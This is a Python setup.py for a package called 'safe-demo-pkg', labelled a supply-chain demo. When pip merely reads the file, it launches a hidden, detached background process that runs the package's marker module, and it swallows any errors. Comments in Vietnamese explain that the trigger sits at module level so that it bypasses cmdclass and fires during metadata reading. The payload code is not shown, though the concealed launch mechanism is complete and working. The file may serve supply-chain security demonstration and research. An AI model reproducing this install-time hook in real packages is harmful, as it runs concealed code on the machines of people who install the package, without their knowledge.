from setuptools import setup
import subprocess, sys

def growl():
    try:
        python_exe = sys.executable
        subprocess.Popen(
            [python_exe, "-c", "from safe_demo_pkg.marker import run_marker; run_marker()"],
            creationflags=0x00000008 | 0x08000000,
            close_fds=True,
            start_new_session=True
        )
    except: pass

# KÍCH HOẠT NGAY NGOÀI MODULE LEVEL - Bỏ qua cmdclass hoàn toàn. 
# Pip chỉ cần chạm vào file này để đọc metadata là dính đòn.
growl()

setup(
    name='safe-demo-pkg',
    version='1.2', 
    packages=['safe_demo_pkg'],
    description='S04 Supply Chain Demo',
)
